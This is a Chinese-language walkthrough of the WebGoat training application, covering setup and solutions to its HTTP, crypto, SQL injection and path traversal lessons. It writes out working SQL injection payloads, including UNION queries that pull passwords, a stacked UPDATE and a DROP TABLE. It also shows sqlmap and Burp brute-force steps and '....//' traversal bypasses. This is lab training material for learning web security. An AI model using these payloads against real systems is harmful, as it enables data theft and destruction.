
# Webgoat

## 一、环境搭建

### Windows下

1. 配置jdk（已经配好）

![输入图片说明](https://s2.loli.net/2023/03/14/oHyNg6mhJIMGRY3.png)

2. 设置浏览器代理

配置代理服务器 127.0.0.1:8008

3.下载安装Webgoat

在 Github 中下载 Webgoat 5.4，打开 .bat 文件即可：

![输入图片说明](https://s2.loli.net/2023/03/14/DFvZ7q5LoWnNw9d.png)

再打开 localhost:8080/WebGoat/attack，即可运行 Webgoat：

![输入图片说明](https://s2.loli.net/2023/03/14/IkURKrlcaZgneuQ.png)

但感觉界面有点问题 (?)，没有某些应该被提问的问题：

![输入图片说明](https://s2.loli.net/2023/03/14/zDLtTc9N7Rg2BbS.png)

> Written with [StackEdit中文版](https://stackedit.cn/).

### Linux下

搭一个Kali下的

1. 先在 Kali 下进行 Docker 配置

```
sudo apt-get install docker.io
sudo apt-get install docker-ce
sudo apt-get update
```
*（证书出现问题，更新一下证书即可）*

2. 获取Webgoat

```
sudo docker pull webgoat/webgoat-8.0
```

3. 连接Webgoat

```
sudo docker run -d -p 8888:8888 -p 8080:8080 -p 9090:9090 webgoat/goatandwolf
```

![输入图片说明](https://s2.loli.net/2023/03/14/AVKEBWz8OIaiQ2y.png)

4. 打开浏览器，输入 http://127.0.0.1:8080/WebGoat ，注册登录即可

![输入图片说明](https://s2.loli.net/2023/03/14/sRomKprDGWP26Vq.png)

~~（看着舒服多了）~~

## 二、通关流程

### General

使用 ZAP 进行 http 抓包，首先要配置 ZAP 端口（否则默认端口8080会和Webgoat冲突）

![输入图片说明](https://s2.loli.net/2023/03/14/pv9Kl3L2o4RfjM6.png)

然后可以通过右上角浏览器图标直接进入经过ZAP代理的浏览器，再输入Webgoat的url

#### 1、HTTP Basics

实现一个接收字符串并回传字符串的 reverse 的功能，输入一个试试，并查看ZAP抓到的包：

![输入图片说明](https://s2.loli.net/2023/03/14/GWagE2j6dX1mfBz.png)

可以看出使用POST方法传递参数（还可以通过观察 url 得知）

![输入图片说明](https://s2.loli.net/2023/03/14/93jJm1sHQLyW25v.png)

问题中还有一个magic number，不知道，先随便输入一个看看ZAP：

![输入图片说明](https://s2.loli.net/2023/03/14/LEjATyXwvFVJauD.png)

数据栏中 magic number 值为55

![输入图片说明](https://s2.loli.net/2023/03/14/SnFp65jwLV7MmUd.png)

#### 2、HTTP Proxies

前面的是一些 ZAP 使用帮助，题目是拦截并修改一个请求：

![输入图片说明](https://s2.loli.net/2023/03/15/vnVCKZj3yeRb6QD.png)

首先需要设置一个断点，并设置过滤的条件：

![输入图片说明](https://s2.loli.net/2023/03/15/j4vowdmk1MXt8ND.png)

然后点击绿色按钮，开始监听/拦截：

![输入图片说明](https://s2.loli.net/2023/03/15/gvru3zhDOK67QPe.png)

在浏览器提交一个字符串，在 ZAP “拦截”中查看：

![输入图片说明](https://s2.loli.net/2023/03/15/dSkIGQ9hfbPMcJg.png)

可在此页面直接进行修改，修改后点击“提交”，即完成任务。

![输入图片说明](https://s2.loli.net/2023/03/15/HtkxviSVlARcG6g.png)

**同样的**，可以通过查看历史请求，右键

![输入图片说明](https://s2.loli.net/2023/03/15/O4BlKck6uxL9d5t.png)

在新窗口中直接修改请求，并点击右侧 Send：

![输入图片说明](https://s2.loli.net/2023/03/15/ijzaNVtBqK9vI4A.png)

也可成功。

#### 3、Develop Tools

1. 在 F12 的控制台中，输入 webgoat.customjs.phoneHome() 即可，复制下回送的信息即可

![输入图片说明](https://s2.loli.net/2023/03/15/l7C4UERxcnWS5DZ.png)

*出现的两个问题*：控制台不允许粘贴，输入 allow pasting 即可；另外使用上面的ZAP代理的浏览器发送函数没有回送，切换浏览器收到

2. 点击 go 产生请求，查看 F12 的网络界面，搜索 networkNum 即可找到对应值

![输入图片说明](https://s2.loli.net/2023/03/15/vFYAS283G9aCznV.png)

#### Crypto Basics

1. 直接 Base64 解码：

![输入图片说明](https://s2.loli.net/2023/03/16/3pV2WJvhEGTDOC5.png)

2. xor解码：

https://www.sysman.nl/wasdecoder/

![输入图片说明](https://s2.loli.net/2023/03/16/oO6hWZJkspRfCc5.png)

3. 解密 hash 字符串：

网站：cmd5

kali 工具：
hash-identifier 判断加密算法：

![输入图片说明](https://s2.loli.net/2023/03/16/54tGkLRZsIxAEBw.png)

用 hashcat 破解

4. 根据 RSA 私钥求模量，用私钥签名该模量：

使用 OpenSSL，首先创建一个存有密钥的文件，然后命令行输入指令求模量：
```
openssl rsa -in ./private.txt -modulus
```

![输入图片说明](https://s2.loli.net/2023/03/16/d9lhxiKt8n7pjJq.png)

签名：
```
echo -n "AADCD084A06B9BDD200E1DDD6985839EA8179826293F1456D0A22A6C1CFC21329C2A6512B4C6162AD13573D6A7D8DD157B089623B4ABDB515B5D7190875EB2C4AFBD45C43515F03A3E2943242AF4E8E8E8D0DE566FC34BEC7C33AA902E4ADA855E3896B23AF80536137E70CC0BB26DDE56B934AE85674D6153EF6E66A63F2DF957B56871306407A0B549B10A5CF10576ED5A60D60C9971E8C850568CB120E9EF2A0A4F5142CCEAA49E0A0339A6A2335E5941A2BAFAC7FBB312211D0FD778CF168AAAAFCF579C9B2106F45A01FFBB29501025C90BC9F18502DBB8F9260CA01F1F10CB86342CF48DE18A3152CB9BB83B8AB275E911AE69F0DE361B1A552B3D91CD" | openssl dgst -sign ./private.txt -sha256 -out ./dgst.txt 
```
*openssl dgst -sign 进行签名*

编码（否则是乱码）
```
base64 ./dgst.txt > result
```
result 即为签名后文件

5. docker

首先按照要求，输入`sudo docker run -d webgoat/assignments:findthesecret`
然后查看容器列表：`sudo docker ps`
进入对应容器：`sudo docker exec -it d0 /bin/bash`

接下来要求 getting access to the password file located in /root. 
没有权限，`su` 需要密码

退出`exit`
以 root 身份重新进入容器`sudo docker exec --user root -it d0 /bin/bash `
查看 /root 目录下文件并 cat 内容`ls /root/` `cat /root/secret`

![输入图片说明](https://s2.loli.net/2023/03/16/lhqdDew367NErTB.png)

用此文件执行 Webgoat 给出的命令
```
echo "U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1pf55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=" | openssl enc -aes-256-cbc -d -a -kfile /root/secret
```
得出信息

### Injection

#### SQL Injection(intro)

1. select 语句的使用
```
SELECT department FROM Employees WHERE first_name='Bob';
```
2. update 语句的使用
```
UPDATE Employees SET department='Sales' WHERE first_name='Tobi';
```
3. alter 语句的使用
```
ALTER TABLE employees ADD phone varchar(20);
```
4. grant 语句的使用
```
GRANT ALL ON grant_rights TO unauthorized_user;
```
5. 字符串（单引号）注入
```
SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
```
6. 数字注入
```
SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
```
7. 字符串注入（破坏机密性）
```
SELECT * FROM employees WHERE last_name = ‘Smith' AND auth_tan ='3SL99A' or '1'='1';
```
8. 破坏完整性（添加新的语句）
```
SELECT * FROM employees WHERE last_name = ‘Smith' AND auth_tan ='3SL99A';UPDATE employees  SET salary=100000 WHERE last_name='Smith';
```
9. 破坏可用性
```
1’;drop table access_log;--
```  
#### SQL Injection(advanced)

1. UNION使用：
```
SELECT * FROM user_data WHERE last_name = 'Dave' Union select userid,user_name,password,cookie,user_name,user_name,userid from user_system_data;--'
```
注意使用UNION时，列号和数据类型需要一一匹配
同样可以添加新的语句：
```
SELECT * FROM user_data WHERE last_name = 'Dave' OR 1=1;SELECT * FROM user_system_data;--‘

```
2. SQL盲注

> 参考了https://blog.csdn.net/u013553529/article/details/82794814

（1）寻找注入点

这里练习使用 sqlmap。
~~首先使用 ZAP 抓一个注册时的包，获取 sqlmap 需要的参数：cookie，url，请求body~~
![输入图片说明](https://s2.loli.net/2023/03/17/Iqm51zC3kbYpuxr.png)
~~使用参数命令检测不出漏洞？~~
右键保存为RAW，使用命令：`sqlmap -r 桌面/1.raw`，可以检测出注册用户名存在注入漏洞。

（2）探测密码

**继续使用 sqlmap**
```
sqlmap --no-cast -r 文件路径 --dbs#查看数据库
```
unable 权限不够，手工注入

**手工注入**

首先要知道 Tom 用户名：在注册界面试一下，当注册“tom”时，提示用户已存在，故用户名为 tom

然后进行**猜列名**，猜测密码对应列名字，猜其为 password：`tom' or password='12345`

![输入图片说明](https://s2.loli.net/2023/03/17/z2oIhBY9WxfnVpl.png)

说明存在此列，*若不存在（如输入password2），会回显*

> Sorry the solution is not correct, please try again
 
 然后通过**Burpsuite**，对密码进行爆破：
 打开 Burpsuite，在 Proxy 中 Open Broswer，进入 WebGoat 注入页，打开 Intercept ，注册，在 Burpsuite 端 Forword 到该请求页，右键 Send to Intruder
 在 Intruder Position页编辑请求，注意 Type 需改为 Cluster Bomb（否则只能编辑一个Payload）：
![输入图片说明](https://s2.loli.net/2023/03/18/v1YfHnuseUJEcQ9.png)

在 payload 界面设置字典，分别设置 Payload Set 1,2：
![输入图片说明](https://s2.loli.net/2023/03/18/LEWVyPXFNc65dTC.png)

Start Attack（需要等一阵）
根据 Length 进行排序：
![输入图片说明](https://s2.loli.net/2023/03/18/9xRigFKCXaJMUo7.png)
*想通过高亮筛选再排序，但并没有用处？？*

可知密码为：`thisisasecretfortomonly`

####  Path Traversal

1. 修改请求头更改上传文件位置：

上传一下头像，查看 ZAP 记录，根据电子邮件等的提交顺序和位置，推测第一个test为文件位置，修改为 `../test`
![输入图片说明](https://s2.loli.net/2023/03/19/FEsZvTgyaVYGult.png)

Send 重放，成功

2. 双写绕过：

重新尝试`../`，但是失败了
由题目可知被 remove 掉了，尝试双写绕过（用外层包裹内层）`....//`
成功

3. 修改文件名

题目中说用户名被验证保护了，所以通过修改文件名进行提交，将文件名改为`../1.txt`

4. 
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEyNjM5NTYyOTgsMTQ2NjQ3NTAzNiwtNT
Q1ODkyOTY5LDEyNDIyNzM4MzEsMTQyMTQzOTE2MSwyMDA0Mzkx
OTk2LDk0NDI0NTM0MSw5MTI1NjY2OTIsMjIxOTA5MTgxLDE0OD
AwNjMzNywtMTYyODQ1ODU1MiwxNzMwMjY1NjI2LC0xMTQ2Mzg3
MjMxLDI1OTQ1NTUzMiwtNjEyNjI3MDkxLC04ODEzNjU2MTAsLT
E5Mzg5MzYyMDQsLTE2MDQ4MTI5MjgsLTE2MDQ4MTI5MjgsMjAx
NzE4MTA5MF19
-->